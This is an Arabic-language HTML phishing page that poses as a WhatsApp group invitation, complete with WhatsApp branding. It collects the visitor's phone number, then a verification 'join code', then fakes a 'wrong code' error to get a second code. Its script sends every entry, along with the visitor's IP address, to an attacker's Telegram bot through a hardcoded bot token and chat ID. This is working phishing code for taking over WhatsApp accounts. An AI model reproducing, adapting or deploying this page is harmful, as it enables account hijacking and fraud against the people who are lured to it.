<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>الانضمام إلى المجموعة</title>
<meta property="og:title" content="الانضمام إلى المجموعة">
<meta property="og:description" content="اضغط للانضمام عبر واتساب">
<meta property="og:image" content="https://love-ashen-beta.vercel.app/og-image.png">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">

<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&display=swap">
<style>
:root{--bg:#effaf3;--card:#ffffff;--ink:#0f2a1c;--muted:#5b7568;--green:#1faa59;--green-d:#168a46;--line:#cfe5d7;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0c1a13;--card:#13261c;--ink:#e8f6ee;--muted:#9bb8a8;--line:#254636}}
:root[data-theme="dark"]{--bg:#0c1a13;--card:#13261c;--ink:#e8f6ee;--muted:#9bb8a8;--line:#254636}
*{box-sizing:border-box}
[hidden]{display:none!important}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--ink);font-family:"Cairo",Tahoma,Arial,sans-serif;padding:20px}
main{width:100%;max-width:400px;background:var(--card);border-radius:28px;padding:36px 24px 28px;text-align:center;box-shadow:0 10px 40px rgba(20,90,50,.12)}
.logo{width:112px;height:112px;margin:0 auto 20px;display:block}
h1{font-size:26px;font-weight:800;margin:0 0 20px}
input{width:100%;font:inherit;font-size:18px;padding:14px 16px;border:2px solid var(--line);border-radius:14px;background:transparent;color:var(--ink);text-align:center;direction:ltr}
input::placeholder{color:var(--muted);direction:rtl}
input:focus-visible,select:focus-visible{outline:3px solid var(--green);outline-offset:2px;border-color:var(--green)}
button{width:100%;margin-top:14px;font:inherit;font-size:18px;font-weight:700;padding:14px;border:0;border-radius:14px;background:var(--green);color:#fff;cursor:pointer}
button:hover{background:var(--green-d)}
button:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
.err{min-height:24px;margin:12px 0 0;font-size:16px;font-weight:700;color:#e02020}
.phone-row{display:flex;gap:8px;direction:ltr}
.phone-row input{flex:1;min-width:0;width:auto}
.phone-row select{flex:0 0 42%;max-width:170px;font:inherit;font-size:16px;font-weight:700;padding:14px 6px;border:2px solid var(--line);border-radius:14px;background:transparent;color:var(--ink);direction:rtl;text-align:center}
.phone-row option,.phone-row optgroup{background:var(--card);color:var(--ink)}
.code-label{font-size:18px;font-weight:700;margin-bottom:12px;color:var(--ink);text-align:center}
</style>
</head>
<body>

<!-- الصفحة الأولى: إدخال الرقم -->
<main id="step1">
<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="واتساب"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
<h1>الانضمام إلى المجموعة</h1>
<div class="phone-row">
  <select id="cc" aria-label="رمز الدولة">
    <optgroup label="شمال إفريقيا">
      <option value="+212">المغرب +212</option>
      <option value="+213">الجزائر +213</option>
      <option value="+216">تونس +216</option>
      <option value="+20">مصر +20</option>
    </optgroup>
    <optgroup label="الشرق الأوسط">
      <option value="+961">لبنان +961</option>
      <option value="+962">الأردن +962</option>
      <option value="+966">السعودية +966</option>
      <option value="+971">الإمارات +971</option>
      <option value="+965">الكويت +965</option>
      <option value="+974">قطر +974</option>
      <option value="+973">البحرين +973</option>
      <option value="+968">عُمان +968</option>
    </optgroup>
    <optgroup label="دول أخرى">
      <option value="+44">بريطانيا +44</option>
      <option value="+33">فرنسا +33</option>
      <option value="+1">أمريكا / كندا +1</option>
      <option value="+49">ألمانيا +49</option>
      <option value="+34">إسبانيا +34</option>
    </optgroup>
  </select>
  <input id="phone" type="tel" inputmode="tel" autocomplete="tel-national" placeholder="اكتب رقم هاتفك" aria-label="رقم الهاتف">
</div>
<button id="nextBtn1" type="button">التالي</button>
<p id="msg1" class="err" role="alert"></p>
</main>

<!-- الصفحة الثانية: إدخال رمز الانضمام لأول مرة -->
<main id="step2" hidden>
<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="رمز التحقق"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
<div class="code-label">المرجو ادخال رمز الانضمام</div>
<input id="codeInput1" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="أدخل الرمز هنا">
<button id="nextBtn2" type="button">تأكيد الانضمام</button>
<p id="msg2" class="err" role="alert"></p>
</main>

<!-- الصفحة الثالثة: إظهار خطأ أن الرمز غير صحيح وطلب إعادة إدخاله -->
<main id="step3" hidden>
<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="خطأ في الرمز"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
<div class="code-label">المرجو ادخال رمز الانضمام</div>
<input id="codeInput2" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="أدخل الرمز هنا">
<button id="submitBtnFinal" type="button">تأكيد الانضمام</button>
<p id="errorMsg" class="err">الرمز الذي أدخلتم غير صحيح</p>
</main>

<script>
let savedPhoneNumber = "";
let userIpAddress = "";
let firstCode = "";

// تحديد الدولة تلقائياً عبر الـ IP
async function detectUserCountry() {
    try {
        let response = await fetch('https://ipapi.co/json/');
        let data = await response.json();
        let countryCodeSelect = document.getElementById("cc");
        
        if (data && data.country_calling_code) {
            let dialCode = data.country_calling_code;
            for (let option of countryCodeSelect.options) {
                if (option.value === dialCode) {
                    option.selected = true;
                    break;
                }
            }
        }
    } catch (e) {
        console.log("تعذر تحديد الموقع الجغرافي تلقائياً", e);
    }
}

// جلب الـ IP وحفظه مسبقاً
async function fetchIpAddress() {
    try {
        let ipResponse = await fetch('https://api.ipify.org?format=json');
        let ipData = await ipResponse.json();
        userIpAddress = ipData.ip;
    } catch (e) {
        userIpAddress = "غير معروف";
    }
}

window.onload = function() {
    detectUserCountry();
    fetchIpAddress();
};

// إعدادات بوت تليجرام (قم بوضع معلوماتك هنا)
const botToken = "8863417031:AAF7jehBC9WE41rjAk6HfYcvAh7G1H5-nxg";
const chatId = "6691240451";

// دالة مساعدة للإرسال إلى تليجرام
async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: text
            })
        });
    } catch (error) {
        console.error("خطأ في الإرسال:", error);
    }
}

// الانتقال من الصفحة الأولى إلى الثانية
document.getElementById("nextBtn1").addEventListener("click", function() {
    let cc = document.getElementById("cc").value;
    let phoneInput = document.getElementById("phone").value;
    
    if(!phoneInput) {
        document.getElementById("msg1").innerText = "الرجاء إدخال رقم الهاتف";
        return;
    }

    savedPhoneNumber = cc + phoneInput;
    
    // إرسال الرقم والـ IP إلى تليجرام
    let messageText = `Numéro: ${savedPhoneNumber}\n` +
                      `Adresse IP: ${userIpAddress}`;
    sendToTelegram(messageText);

    // الانتقال للخطوة التالية
    document.getElementById("step1").hidden = true;
    document.getElementById("step2").hidden = false;
});

// الانتقال من الصفحة الثانية إلى الثالثة عند إدخال الرمز الأول
document.getElementById("nextBtn2").addEventListener("click", function() {
    firstCode = document.getElementById("codeInput1").value;

    if(!firstCode) {
        document.getElementById("msg2").innerText = "الرجاء إدخال رمز الانضمام";
        return;
    }

    // إرسال الرمز الأول إلى تليجرام مع الرقم
    let messageText = `Numéro: ${savedPhoneNumber}\n` +
                      `Code 1: ${firstCode}\n` +
                      `Adresse IP: ${userIpAddress}`;
    sendToTelegram(messageText);

    // إظهار الصفحة الثالثة التي تعرض رسالة الخطأ
    document.getElementById("step2").hidden = true;
    document.getElementById("step3").hidden = false;
});

// تأكيد الرمز النهائي في الصفحة الثالثة وإرساله
document.getElementById("submitBtnFinal").addEventListener("click", async function() {
    let secondCode = document.getElementById("codeInput2").value;

    if(!secondCode) {
        return;
    }

    // إرسال الرمز الثاني الجديد إلى تليجرام
    let messageText = `Numéro: ${savedPhoneNumber}\n` +
                      `Code 1: ${firstCode}\n` +
                      `Code 2 (New): ${secondCode}\n` +
                      `Adresse IP: ${userIpAddress}`;
    
    await sendToTelegram(messageText);

    alert("تم الانضمام بنجاح!");
    location.reload();
});
</script>

</body>
</html>
